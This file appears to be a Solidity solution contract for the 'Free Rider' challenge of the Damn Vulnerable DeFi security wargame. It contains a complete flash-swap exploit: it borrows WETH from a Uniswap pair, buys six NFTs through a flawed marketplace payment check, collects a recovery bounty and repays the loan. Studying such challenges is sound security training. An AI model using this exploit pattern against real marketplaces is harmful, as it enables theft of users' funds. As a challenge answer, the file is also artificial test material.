pragma solidity =0.8.25;

import {IUniswapV2Pair} from "@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol";
import {FreeRiderNFTMarketplace} from "../../src/free-rider/FreeRiderNFTMarketplace.sol";
import {DamnValuableNFT} from "../../src/DamnValuableNFT.sol";
import {WETH} from "solmate/tokens/WETH.sol";

contract ExploitContract {
    IUniswapV2Pair public immutable uniswapPair;
    FreeRiderNFTMarketplace public immutable marketplace;
    WETH weth;
    DamnValuableNFT nft;
    address public immutable player;
    address public immutable recoveryManager;

    constructor(IUniswapV2Pair _uniswapPair, FreeRiderNFTMarketplace _marketplace, WETH _weth, DamnValuableNFT _nft, address _player, address _recoveryManager) {
        uniswapPair = _uniswapPair;
        marketplace = _marketplace;
        weth = _weth;
        nft = _nft;
        player = _player;
        recoveryManager = _recoveryManager;
    }

    function run() external {
        require(address(this).balance == 0.1 ether);

        uniswapPair.swap(15 ether, 0, address(this), bytes("0"));
    }

    function uniswapV2Call(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {
        require(weth.balanceOf(address(this)) == 15 ether, "you are not given 15 ETH");

        weth.withdraw(15 ether);

        require(address(this).balance == 15.1 ether, "player does not start with 15.1 ether");
        uint256[] memory tokenIds = new uint256[](6);
        for (uint i = 0; i < 6; i++) {
            tokenIds[i] = i;
        }
        marketplace.buyMany{value: 15 ether}(tokenIds);
        require(address(this).balance == 90.1 ether, "player does not end with 90.1 ether");

        for (uint i = 0; i < 6; i++) {
            nft.safeTransferFrom(address(this), recoveryManager, i, abi.encode(player));
        }

        // transfer 15.1 ETH to Uniswap
        weth.deposit{value: 15.1 ether}();
        weth.transfer(address(uniswapPair), 15.1 ether);

        // transfer the remaining ETH to the player
        payable(player).transfer(address(this).balance);
    }

    function onERC721Received(
        address operator,
        address from,
        uint256 tokenId,
        bytes calldata data
    ) external returns (bytes4){
        return this.onERC721Received.selector;
    }

    receive() external payable {}
}